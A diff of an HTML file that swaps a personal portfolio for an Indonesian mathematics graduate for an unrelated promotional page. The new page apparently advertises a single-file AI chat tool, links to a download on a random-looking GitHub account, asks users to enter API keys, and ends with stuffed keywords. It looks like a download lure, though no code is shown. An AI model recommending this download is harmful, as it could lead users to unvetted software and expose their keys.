@@ -1,307 +1,67 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Hazem — Mathematics & Data Science</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
-<style>
-  :root{
-    --ink:#12161c;
-    --ink-2:#1a2029;
-    --paper:#f3f1ea;
-    --chalk:#7fb0d9;
-    --chalk-dim:#4d7391;
-    --gold:#c9a24a;
-    --grey:#8b93a1;
-    --line: rgba(243,241,234,0.12);
-    --radius: 2px;
-  }
-  *{box-sizing:border-box; margin:0; padding:0;}
-  html{scroll-behavior:smooth;}
-  body{
-    background:var(--ink);
-    color:var(--paper);
-    font-family:'IBM Plex Sans', sans-serif;
-    line-height:1.6;
-    overflow-x:hidden;
-  }
-  ::selection{ background:var(--chalk); color:var(--ink); }
-
-  h1,h2,h3{ font-family:'Fraunces', serif; font-weight:500; letter-spacing:-0.01em; }
-
-  a{ color:inherit; }
-
-  .wrap{ max-width:960px; margin:0 auto; padding:0 32px; }
-
-  /* NAV */
-  nav{
-    position:fixed; top:0; left:0; right:0; z-index:50;
-    background:rgba(18,22,28,0.85); backdrop-filter:blur(8px);
-    border-bottom:1px solid var(--line);
-  }
-  nav .wrap{ display:flex; justify-content:space-between; align-items:center; height:64px; }
-  .logo{ font-family:'IBM Plex Mono', monospace; font-size:15px; letter-spacing:0.02em; }
-  .logo span{ color:var(--chalk); }
-  .navlinks{ display:flex; gap:28px; list-style:none; font-family:'IBM Plex Mono', monospace; font-size:13px; }
-  .navlinks a{ text-decoration:none; color:var(--grey); transition:color .2s; }
-  .navlinks a:hover{ color:var(--paper); }
-
-  /* HERO */
-  header.hero{
-    position:relative;
-    min-height:100vh;
-    display:flex; align-items:center;
-    padding-top:64px;
-    overflow:hidden;
-  }
-  .hero-curve{
-    position:absolute; inset:0; z-index:0; opacity:0.55;
-    pointer-events:none;
-  }
-  .hero-inner{ position:relative; z-index:1; }
-  .eyebrow{
-    font-family:'IBM Plex Mono', monospace;
-    color:var(--chalk); font-size:13px; letter-spacing:0.08em; text-transform:uppercase;
-    margin-bottom:20px; display:flex; align-items:center; gap:10px;
-  }
-  .eyebrow::before{ content:''; width:24px; height:1px; background:var(--chalk); display:inline-block; }
-  .hero h1{
-    font-size:clamp(38px, 6vw, 68px);
-    line-height:1.05;
-    max-width:820px;
-  }
-  .hero h1 em{ font-style:italic; color:var(--chalk); }
-  .hero p.lede{
-    margin-top:24px; max-width:560px; color:var(--grey); font-size:17px;
-  }
-  .hero-meta{
-    margin-top:40px; display:flex; gap:36px; flex-wrap:wrap;
-    font-family:'IBM Plex Mono', monospace; font-size:13px; color:var(--grey);
-  }
-  .hero-meta strong{ display:block; color:var(--paper); font-size:20px; font-family:'Fraunces', serif; font-weight:500; }
-
-  section{ padding:110px 0; border-top:1px solid var(--line); position:relative; }
-  .num{
-    font-family:'IBM Plex Mono', monospace; color:var(--chalk-dim); font-size:13px;
-    margin-bottom:14px; letter-spacing:0.05em;
-  }
-  h2.title{ font-size:clamp(28px,4vw,38px); margin-bottom:48px; max-width:620px; }
-
-  /* ABOUT */
-  .about-grid{ display:grid; grid-template-columns:1.1fr 0.9fr; gap:64px; }
-  @media(max-width:760px){ .about-grid{ grid-template-columns:1fr; } }
-  .about-text p{ color:var(--grey); margin-bottom:16px; font-size:16px; }
-  .about-text strong{ color:var(--paper); font-weight:500; }
-  .skillbox{ border:1px solid var(--line); padding:28px; background:var(--ink-2); }
-  .skillbox h3{ font-size:15px; font-family:'IBM Plex Mono', monospace; color:var(--chalk); text-transform:uppercase; letter-spacing:0.06em; margin-bottom:18px; font-weight:500; }
-  .skill-row{ display:flex; justify-content:space-between; padding:10px 0; border-bottom:1px solid var(--line); font-size:14px; }
-  .skill-row:last-child{ border-bottom:none; }
-  .skill-row span:first-child{ color:var(--paper); }
-  .skill-row span:last-child{ color:var(--grey); font-family:'IBM Plex Mono', monospace; font-size:12px; }
-
-  /* PROJECTS */
-  .project{
-    padding:36px 0; border-bottom:1px solid var(--line);
-    display:grid; grid-template-columns:200px 1fr; gap:32px;
-  }
-  .project:last-child{ border-bottom:none; }
-  @media(max-width:700px){ .project{ grid-template-columns:1fr; gap:12px; } }
-  .project-tag{ font-family:'IBM Plex Mono', monospace; font-size:12px; color:var(--chalk); text-transform:uppercase; letter-spacing:0.05em; }
-  .project h3{ font-size:22px; margin-bottom:10px; font-weight:500; }
-  .project p{ color:var(--grey); font-size:15px; margin-bottom:12px; }
-  .tags{ display:flex; gap:8px; flex-wrap:wrap; }
-  .tags span{
-    font-family:'IBM Plex Mono', monospace; font-size:11px; color:var(--chalk-dim);
-    border:1px solid var(--line); padding:4px 10px;
-  }
-
-  /* EXPERIENCE */
-  .exp-item{ display:flex; gap:32px; padding:24px 0; border-bottom:1px solid var(--line); }
-  .exp-item:last-child{ border-bottom:none; }
-  .exp-item .when{ font-family:'IBM Plex Mono', monospace; font-size:12px; color:var(--grey); width:110px; flex-shrink:0; padding-top:4px; }
-  .exp-item h3{ font-size:17px; font-weight:500; margin-bottom:6px; }
-  .exp-item p{ color:var(--grey); font-size:14.5px; }
-
-  /* CONTACT */
-  footer{ padding:100px 0 60px; text-align:center; }
-  footer h2{ font-size:clamp(30px,5vw,46px); margin-bottom:20px; }
-  footer p{ color:var(--grey); max-width:440px; margin:0 auto 36px; }
-  .cta{
-    display:inline-flex; align-items:center; gap:10px;
-    border:1px solid var(--chalk); color:var(--chalk);
-    padding:14px 28px; font-family:'IBM Plex Mono', monospace; font-size:13px;
-    text-decoration:none; letter-spacing:0.04em; transition:.2s;
-  }
-  .cta:hover{ background:var(--chalk); color:var(--ink); }
-  .foot-links{ margin-top:44px; display:flex; justify-content:center; gap:24px; font-family:'IBM Plex Mono', monospace; font-size:13px; color:var(--grey); }
-  .foot-links a{ text-decoration:none; }
-  .foot-links a:hover{ color:var(--paper); }
-  .copyright{ margin-top:60px; font-family:'IBM Plex Mono', monospace; font-size:11px; color:#4a5162; }
-
-  @media (prefers-reduced-motion: reduce){
-    .hero-curve path{ animation:none !important; }
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="One-Chat is a simple AI chat interface that works in your web browser. Connect to local or cloud AI models without installation.">
+    <title>One-Chat | AI Chat Interface</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6;">
 
-<nav>
-  <div class="wrap">
-    <div class="logo">hazem<span>.</span>dev</div>
-    <ul class="navlinks">
-      <li><a href="#about">About</a></li>
-      <li><a href="#projects">Projects</a></li>
-      <li><a href="#experience">Experience</a></li>
-      <li><a href="#contact">Contact</a></li>
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #ddd; padding-bottom: 10px;">🤖 One-Chat - Simple AI Chat For Everyone</h1>
+
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/neritic-enterprisingness382/One-Chat" style="background-color: #2c3e50; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download One-Chat Now</a>
+    </div>
+
+    <h2 style="color: #2c3e50;">💡 What is One-Chat?</h2>
+    <p>One-Chat provides a clean way to talk to AI models. It runs inside your web browser. You do not need to install complex software or manage databases. The program consists of a single file. You open this file in your browser to start your chat session.</p>
+
+    <h2 style="color: #2c3e50;">🚀 How to Start</h2>
+    <p>You can begin using One-Chat in a few movements. Follow these steps to set up the software on your Windows computer.</p>
+    <ol style="line-height: 2;">
+        <li>Visit the <a href="https://github.com/neritic-enterprisingness382/One-Chat" style="color: #3498db;">project page</a> to access the download options.</li>
+        <li>Locate the download button or link on the page.</li>
+        <li>Save the HTML file to your computer.</li>
+        <li>Find the file in your downloads folder.</li>
+        <li>Double-click the file to open it in your preferred web browser.</li>
+        <li>Enter your API key or point the settings to your local AI service.</li>
+        <li>Send your first message to the AI.</li>
+    </ol>
+
+    <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+    <p>One-Chat works on most modern computer systems. You need a standard web browser such as Chrome, Firefox, or Edge. Your system needs an internet connection if you plan to use cloud-based AI services. If you use local AI models, ensure your computer has enough memory to run the model software like Ollama or LM Studio.</p>
+
+    <h2 style="color: #2c3e50;">📦 Features</h2>
+    <ul style="line-height: 2;">
+        <li><strong>Zero Installation:</strong> No background processes or heavy builds.</li>
+        <li><strong>Single File Design:</strong> Store and move your application anywhere.</li>
+        <li><strong>Privacy:</strong> Your chat data stays local unless you send it to a cloud provider.</li>
+        <li><strong>Flexible Models:</strong> Switch between local models and popular cloud services effortlessly.</li>
+        <li><strong>Clean Interface:</strong> A simple layout helps you focus on your conversations.</li>
     </ul>
-  </div>
-</nav>
 
-<header class="hero">
-  <svg class="hero-curve" viewBox="0 0 960 700" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
-    <path d="M -50 500 C 150 300, 300 650, 500 400 S 800 150, 1050 380" stroke="#3f5a70" stroke-width="1" fill="none"/>
-    <path d="M -50 560 C 180 380, 320 700, 520 470 S 820 220, 1050 440" stroke="#2c4152" stroke-width="1" fill="none"/>
-    <path id="frame-curve" d="M -50 440 C 160 220, 340 560, 540 320 S 840 80, 1050 320" stroke="#7fb0d9" stroke-width="1.4" fill="none" stroke-dasharray="6 8">
-      <animate attributeName="stroke-dashoffset" from="0" to="-140" dur="9s" repeatCount="indefinite"/>
-    </path>
-    <g fill="#c9a24a">
-      <circle cx="540" cy="320" r="3.5"/>
-    </g>
-  </svg>
+    <h2 style="color: #2c3e50;">🛠 Supported Services</h2>
+    <p>One-Chat connects to many AI tools. You can use this interface with several providers:</p>
+    <ul>
+        <li>OpenAI for standard chat tasks.</li>
+        <li>Google Gemini for advanced reasoning.</li>
+        <li>Ollama for private and local processing.</li>
+        <li>Groq for fast interactions.</li>
+        <li>Local AI models running on your own hardware.</li>
+    </ul>
 
-  <div class="wrap hero-inner">
-    <div class="eyebrow">Padang, Indonesia</div>
-    <h1>Membaca pola di balik <em>data</em>, sebagaimana geometri membaca kelengkungan permukaan.</h1>
-    <p class="lede">Hazem — lulusan Matematika &amp; Data Science, Universitas Andalas. Fokus pada analisis kuantitatif, statistik, dan penerapan matematika pada masalah nyata.</p>
-    <div class="hero-meta">
-      <div><strong>3.48</strong>GPA / 4.00</div>
-      <div><strong>Analysis &amp;<br>Geometry</strong>Spesialisasi</div>
-      <div><strong>4 semester</strong>Asisten Lab &amp; Dosen</div>
+    <h2 style="color: #2c3e50;">🔑 Using API Keys</h2>
+    <p>Most AI services require an API key. You get this key from the provider website. Paste the key into the settings area of One-Chat. The application saves your key in your browser storage. This ensures the key stays on your machine and does not move to a central server.</p>
+
+    <h2 style="color: #2c3e50;">❓ Frequently Asked Questions</h2>
+    <p><strong>Do I need to program?</strong> No. You never touch code.</p>
+    <p><strong>Is this free?</strong> The software is free to use. However, some AI providers charge for their services separately.</p>
+    <p><strong>How do I update the application?</strong> Just download the new version of the file from the link above and replace your old file.</p>
+
+    <div style="background-color: #e8ecef; padding: 20px; border-radius: 8px; margin-top: 40px;">
+        <p style="font-style: italic; font-size: 0.9em;">Keywords: 9router, ai, chrom-ai, cloud-ai, deepseek, fireworks-ai, google-gemini, groq, html, lmstudio, local-ai, ollama, openai, openrouter, together-ai</p>
     </div>
-  </div>
-</header>
-
-<section id="about">
-  <div class="wrap">
-    <div class="num">01 — Tentang</div>
-    <h2 class="title">Latar belakang akademik &amp; kemampuan teknis</h2>
-    <div class="about-grid">
-      <div class="about-text">
-        <p>Saya lulusan <strong>Matematika dan Data Science, Universitas Andalas</strong>, dengan spesialisasi di bidang <strong>Analysis and Geometry</strong>. Skripsi saya membahas kinematika gerak sliding-rolling antar permukaan reguler menggunakan pendekatan <strong>Darboux frame</strong> dan adjoint, divalidasi dengan simulasi MATLAB.</p>
-        <p>Latar belakang akademik saya mencakup real analysis, statistika matematika, metode numerik, dan geometri diferensial — fondasi yang saya bawa ke pekerjaan berbasis data: mulai dari pemodelan, analisis kuantitatif, hingga business development.</p>
-        <p>Saat ini saya aktif mencari peran di bidang <strong>data analytics, banking, business development, finance,</strong> dan <strong>teaching</strong>.</p>
-      </div>
-      <div class="skillbox">
-        <h3>Toolkit</h3>
-        <div class="skill-row"><span>Python</span><span>analysis / modeling</span></div>
-        <div class="skill-row"><span>MATLAB</span><span>simulation</span></div>
-        <div class="skill-row"><span>SQL</span><span>MySQL Workbench</span></div>
-        <div class="skill-row"><span>R / Minitab</span><span>statistics</span></div>
-        <div class="skill-row"><span>Google Sheets / Excel</span><span>reporting</span></div>
-        <div class="skill-row"><span>LaTeX</span><span>documentation</span></div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section id="projects">
-  <div class="wrap">
-    <div class="num">02 — Proyek</div>
-    <h2 class="title">Proyek kuantitatif yang menerapkan matematika ke masalah nyata</h2>
-
-    <div class="project">
-      <div class="project-tag">Skripsi</div>
-      <div>
-        <h3>Kinematika Sliding-Rolling via Darboux Frame</h3>
-        <p>Menurunkan kinematika gerak menggelinding-menggeser antara dua permukaan reguler menggunakan Darboux frame dan pendekatan adjoint, kemudian memvalidasi hasil analitik melalui simulasi numerik di MATLAB.</p>
-        <div class="tags"><span>Differential Geometry</span><span>MATLAB</span><span>Numerical Validation</span></div>
-      </div>
-    </div>
-
-    <div class="project">
-      <div class="project-tag">Data Analysis</div>
-      <div>
-        <h3>Indeks Pasar Saham FAANG (Free-Float Market Cap)</h3>
-        <p>Membangun indeks pasar saham berbasis free-float market capitalization untuk saham FAANG menggunakan Google Sheets, dari pengambilan data mentah hingga perhitungan indeks.</p>
-        <div class="tags"><span>Google Sheets</span><span>Financial Data</span><span>Indexing</span></div>
-      </div>
-    </div>
-
-    <div class="project">
-      <div class="project-tag">Modeling</div>
-      <div>
-        <h3>Model Epidemi/Penyebaran Informasi SPIH</h3>
-        <p>Mengembangkan model kompartemental SPIH untuk mensimulasikan dinamika penyebaran epidemi maupun informasi dalam suatu populasi.</p>
-        <div class="tags"><span>Compartmental Model</span><span>Simulation</span></div>
-      </div>
-    </div>
-
-    <div class="project">
-      <div class="project-tag">Optimization</div>
-      <div>
-        <h3>Optimasi Waypoint dengan Algoritma Genetika</h3>
-        <p>Studi penerapan algoritma genetika untuk menyelesaikan masalah optimasi rute/waypoint.</p>
-        <div class="tags"><span>Genetic Algorithm</span><span>Optimization</span></div>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section id="experience">
-  <div class="wrap">
-    <div class="num">03 — Pengalaman</div>
-    <h2 class="title">Organisasi &amp; pengajaran</h2>
-
-    <div class="exp-item">
-      <div class="when">4 Semester</div>
-      <div>
-        <h3>Asisten Laboratorium &amp; Pengajaran — Universitas Andalas</h3>
-        <p>Mengampu 40–60 mahasiswa per semester untuk mata kuliah Metode Numerik, Algoritma dan Pemrograman, Persamaan Diferensial, Metode Statistika, dan Statistika Matematika.</p>
-      </div>
-    </div>
-
-    <div class="exp-item">
-      <div class="when">Ketua</div>
-      <div>
-        <h3>Executive Chair — Pekan Seni Bermatematika XXII</h3>
-        <p>Memimpin lebih dari 250 anggota panitia untuk menyelenggarakan acara dengan 700+ peserta, termasuk mengamankan sponsorship eksternal.</p>
-      </div>
-    </div>
-
-    <div class="exp-item">
-      <div class="when">Kepala Divisi</div>
-      <div>
-        <h3>Upgrading &amp; Recruitment — Lab Matematika Komputasi &amp; Data Science</h3>
-        <p>Mengelola proses upgrading dan rekrutmen anggota laboratorium.</p>
-      </div>
-    </div>
-
-    <div class="exp-item">
-      <div class="when">Organisasi</div>
-      <div>
-        <h3>Himatika &amp; BEM KM FMIPA — Universitas Andalas</h3>
-        <p>Berbagai peran organisasi di tingkat jurusan dan fakultas.</p>
-      </div>
-    </div>
-  </div>
-</section>
-
-<footer id="contact">
-  <div class="wrap">
-    <div class="num" style="justify-content:center; display:flex;">04 — Kontak</div>
-    <h2>Mari terhubung.</h2>
-    <p>Terbuka untuk peluang di bidang data analytics, banking, business development, finance, dan teaching.</p>
-    <a class="cta" href="mailto:hazemhawari22@gmail.com">Kirim Email →</a>
-    <div class="foot-links">
-      <a href="https://www.linkedin.com/in/hazem-hawari/">LinkedIn</a>
-      <a href="https://github.com/hazemhawari22">GitHub</a>
-      <a href="cv.pdf">Download CV</a>
-    </div>
-    <div class="copyright">© 2026 Hazem. Built with care.</div>
-  </div>
-</footer>
 
 </body>
 </html>
